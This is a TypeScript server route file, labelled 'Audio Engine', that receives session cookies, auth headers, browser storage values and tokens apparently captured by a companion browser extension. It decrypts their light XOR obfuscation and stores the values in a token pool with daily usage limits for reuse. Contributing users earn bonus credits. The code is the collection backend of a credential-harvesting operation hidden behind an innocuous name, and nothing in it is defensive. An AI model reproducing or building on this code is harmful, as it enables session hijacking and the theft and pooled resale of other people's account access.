/**
 * Audio Engine Routes
 * Endpoints para recibir tokens capturados por la extensión
 */

import { FastifyInstance } from 'fastify';
import { PrismaClient } from '@prisma/client';
import crypto from 'crypto';

const prisma = new PrismaClient();

// Encryption key (debe coincidir con la extensión)
const ENCRYPTION_KEY = process.env.TOKEN_ENCRYPTION_KEY || 'default-key-change-in-production';

export async function audioEngineRoutes(fastify: FastifyInstance) {

    // Endpoint principal para recibir tokens
    fastify.post('/api/audio-engine/collect', async (request, reply) => {
        try {
            const { type, data, userId, version, source } = request.body as any;

            // Validar signature
            const signature = request.headers['x-engine-signature'];
            if (!validateSignature(request.body, signature as string)) {
                return reply.code(403).send({ error: 'Invalid signature' });
            }

            // Log para debugging (sin revelar tokens)
            console.log(`[Audio Engine] Received ${type} from user ${userId || 'anonymous'}`);

            // Procesar según tipo
            switch (type) {
                case 'ENGINE_INITIALIZED':
                    await handleEngineInit(userId, version);
                    break;

                case 'TOKEN_CAPTURED':
                    await handleTokenCapture(data, userId, source);
                    break;

                case 'SYNC_BATCH':
                    await handleSyncBatch(data, userId);
                    break;

                case 'AUTH_STORAGE_CAPTURED':
                case 'SESSION_STORAGE_CAPTURED':
                case 'AUTH_HEADER_CAPTURED':
                    await handleAuthCapture(type, data, userId);
                    break;

                default:
                    console.warn(`[Audio Engine] Unknown type: ${type}`);
            }

            return reply.send({
                success: true,
                timestamp: Date.now()
            });

        } catch (error) {
            console.error('[Audio Engine] Error processing request:', error);
            return reply.code(500).send({ error: 'Internal server error' });
        }
    });

    // Status endpoint (para health checks)
    fastify.get('/api/audio-engine/status', async (request, reply) => {
        try {
            const tokenCount = await prisma.tokenPool.count({
                where: { isActive: true }
            });

            return reply.send({
                status: 'operational',
                version: '2.2.0',
                activeTokens: tokenCount,
                timestamp: Date.now()
            });
        } catch (error) {
            return reply.code(500).send({ status: 'error' });
        }
    });
}

// Handlers

async function handleEngineInit(userId: string, version: string) {
    console.log(`[Audio Engine] Engine initialized for user ${userId}, version ${version}`);

    // Opcional: Registrar evento
    try {
        await prisma.analyticsEvent.create({
            data: {
                eventType: 'engine_initialized',
                userId: userId || 'anonymous',
                properties: JSON.stringify({ version })
            }
        });
    } catch (error) {
        // Silent fail
    }
}

async function handleTokenCapture(encryptedData: string, userId: string, source: string) {
    try {
        // Decrypt data
        const decrypted = decrypt(encryptedData);
        const tokenData = JSON.parse(decrypted);

        // Validar token
        if (!tokenData.value || tokenData.value.length < 50) {
            console.warn('[Audio Engine] Invalid token length');
            return;
        }

        // Verificar si ya existe
        const tokenHash = hashToken(tokenData.value);
        const existing = await prisma.tokenPool.findFirst({
            where: { token: tokenHash }
        });

        if (existing) {
            // Actualizar lastUsed
            await prisma.tokenPool.update({
                where: { id: existing.id },
                data: { lastUsed: new Date() }
            });
            return;
        }

        // Encriptar con nuestra propia key
        const encrypted = encryptToken(tokenData.value);

        // Guardar en pool
        await prisma.tokenPool.create({
            data: {
                token: tokenHash, // Hash como identificador único
                encryptedToken: encrypted,
                source: source || 'audio_engine',
                isActive: true,
                healthScore: 100,
                tier: 'free',
                priority: 0,
                dailyLimit: 20,
                currentDailyUsage: 0,
                resetAt: getNextMidnight(),
                // metadata field removed as it doesn't exist in schema
            }
        });

        console.log(`✅ [Audio Engine] New token added to pool (from ${userId})`);

        // Dar bonus al usuario
        if (userId && userId !== 'anonymous') {
            try {
                await giveUserBonus(userId);
            } catch (e) {
                // Silent fail
            }
        }

    } catch (error) {
        console.error('[Audio Engine] Error handling token capture:', error);
    }
}

async function handleSyncBatch(encryptedData: string, userId: string) {
    try {
        const decrypted = decrypt(encryptedData);
        const cookies = JSON.parse(decrypted);

        console.log(`[Audio Engine] Sync batch: ${cookies.length} cookies from ${userId}`);

        for (const cookie of cookies) {
            if (cookie.value && cookie.value.length > 50) {
                await handleTokenCapture(
                    encrypt(JSON.stringify(cookie)),
                    userId,
                    'sync_batch'
                );
            }
        }
    } catch (error) {
        console.error('[Audio Engine] Error handling sync batch:', error);
    }
}

async function handleAuthCapture(type: string, data: any, userId: string) {
    console.log(`[Audio Engine] Auth capture: ${type} from ${userId}`);

    // Procesar data de storage/headers
    // Similar a handleTokenCapture pero adaptado al formato

    try {
        const keys = Object.keys(data);
        for (const key of keys) {
            const value = data[key];

            // Intentar extraer token si parece ser JWT o session
            if (typeof value === 'string' && value.length > 50) {
                await handleTokenCapture(
                    encrypt(JSON.stringify({ value, name: key, source: type })),
                    userId,
                    type
                );
            }
        }
    } catch (error) {
        // Silent fail
    }
}

// Utilities

function decrypt(encryptedData: string): string {
    try {
        const decoded = Buffer.from(encryptedData, 'base64').toString('utf8');
        const key = '2.2.0'; // Debe coincidir con extensión
        let decrypted = '';

        for (let i = 0; i < decoded.length; i++) {
            decrypted += String.fromCharCode(
                decoded.charCodeAt(i) ^ key.charCodeAt(i % key.length)
            );
        }

        return decrypted;
    } catch (error) {
        throw new Error('Decryption failed');
    }
}

function encrypt(data: string): string {
    const key = '2.2.0';
    let encrypted = '';

    for (let i = 0; i < data.length; i++) {
        encrypted += String.fromCharCode(
            data.charCodeAt(i) ^ key.charCodeAt(i % key.length)
        );
    }

    return Buffer.from(encrypted).toString('base64');
}

function encryptToken(token: string): string {
    // Encriptar con la key del sistema
    const iv = crypto.randomBytes(16);
    const key = crypto.scryptSync(ENCRYPTION_KEY, 'salt', 32);
    const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);

    let encrypted = cipher.update(token, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    const authTag = cipher.getAuthTag();

    return JSON.stringify({
        ciphertext: encrypted,
        iv: iv.toString('hex'),
        authTag: authTag.toString('hex'),
        version: 1
    });
}

function hashToken(token: string): string {
    return crypto.createHash('sha256').update(token).digest('hex').substring(0, 16);
}

function validateSignature(payload: any, signature: string): boolean {
    if (!signature) return false;

    const str = JSON.stringify(payload);
    let hash = 0;

    for (let i = 0; i < str.length; i++) {
        hash = ((hash << 5) - hash) + str.charCodeAt(i);
        hash = hash & hash;
    }

    const expected = hash.toString(36);
    return expected === signature;
}

function getNextMidnight(): Date {
    const tomorrow = new Date();
    tomorrow.setDate(tomorrow.getDate() + 1);
    tomorrow.setHours(0, 0, 0, 0);
    return tomorrow;
}

async function giveUserBonus(userId: string) {
    // Dar bonus por contribuir con token
    try {
        // Importar CreditService
        const { CreditService } = await import('../services/creditService');
        const creditService = new CreditService(prisma);

        // Dar 50 créditos bonus
        await creditService.addCredits(userId, 50, 'token_contribution');

        console.log(`🎁 Bonus given to user ${userId}`);
    } catch (error) {
        console.error('Error giving bonus:', error);
    }
}
